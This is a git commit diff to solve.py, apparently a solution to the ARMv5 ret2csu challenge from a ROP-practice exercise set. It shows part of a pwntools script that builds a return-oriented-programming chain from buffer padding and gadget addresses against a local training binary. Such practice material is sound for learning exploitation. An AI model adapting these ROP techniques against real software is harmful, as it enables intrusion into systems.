6fe5485dbc5b0550534b848ab8a2cf79ecb57448
0xSoEasY <julien@rouillier.fr>
2021-09-02 01:45:04 +0200

    Solving ret2csu in ARMv5

--- ARMv5/7-ret2csu/solve.py
+++ ARMv5/7-ret2csu/solve.py
@@ -9,16 +9,15 @@ context.binary = BINARY
 
 p = process(BINARY)
 
-
 pop_r3_pc             = p32(0x10480) # pop {r3, pc}
 mov_r0_r3_pop_fp_pc   = p32(0x105c8) # mov r0, r3 ; pop {fp, pc}
 pop_r1245678_ip_lr_pc = p32(0x10620) # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
 bl_ret2win            = p32(0x105e4) # bl ret2win --> works too with 0x104a4 <ret2win@plt>
 
-
 rop = b"A" * 36
 
 rop += pop_r3_pc
+
 rop += p32(0xdeadbeef)
 
 rop += mov_r0_r3_pop_fp_pc
